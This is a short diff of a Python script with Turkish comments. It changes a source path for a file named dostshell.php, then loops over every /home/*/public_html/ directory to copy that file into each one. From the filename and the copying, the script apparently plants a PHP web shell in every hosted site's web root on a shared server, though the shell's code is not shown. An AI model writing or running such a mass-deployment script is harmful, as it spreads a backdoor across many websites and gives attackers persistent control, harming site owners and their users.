@@ -2,7 +2,7 @@ import glob
 import shutil
 
 # Kaynak dosyanın yolu
-source_file = '/home/elabins.com/wp/dostshell.php'
+source_file = '/home/dostshell.php'
 
 # Hedef dizinleri bul ve dosyayı kopyala
 for target_dir in glob.glob('/home/*/public_html/'):
